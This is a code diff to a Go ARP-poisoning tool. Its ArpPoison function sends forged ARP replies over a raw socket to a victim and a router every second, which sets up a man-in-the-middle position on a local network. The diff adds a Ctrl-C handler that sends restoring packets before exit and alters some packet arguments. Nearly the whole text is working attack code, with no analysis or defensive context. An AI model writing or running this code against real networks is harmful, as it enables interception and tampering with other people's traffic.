@@ -5,9 +5,11 @@ import (
 	"net"
 	"syscall"
 	"time"
+	"os/signal"
+	"os"	
 )
 
-func ArpPoison(args [][]byte, inter *net.Interface) {
+func ArpPoison (args [][]byte, inter *net.Interface) {
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	if err != nil {
 		log.Fatal(err)
@@ -15,10 +17,19 @@ func ArpPoison(args [][]byte, inter *net.Interface) {
 	addr := syscall.SockaddrLinklayer {
 		Ifindex: inter.Index,
 	}
-	for true {
-		time.Sleep(time.Second)
-		sendPacket(fd, pkt_for_victim(args[4], args[1], args[2], args[3]), &addr)
-		sendPacket(fd, pkt_for_router(args[0], args[1], args[4], args[5]), &addr)
+	chanSig := make(chan os.Signal, 1)
+	signal.Notify(chanSig, syscall.SIGINT)
+	for {
+		select {
+		case <-chanSig:
+			sendPacket(fd, pkt_for_victim(args[4], args[5], args[2], args[3]), &addr)
+			sendPacket(fd, pkt_for_router(args[0], args[1], args[4], args[5]), &addr)
+			os.Exit(0)
+		default:
+			sendPacket(fd, pkt_for_victim(args[4], args[1], args[2], args[3]), &addr)
+			sendPacket(fd, pkt_for_router(args[2], args[1], args[4], args[5]), &addr)
+			time.Sleep(time.Second)
+		}
 	}
 }
 
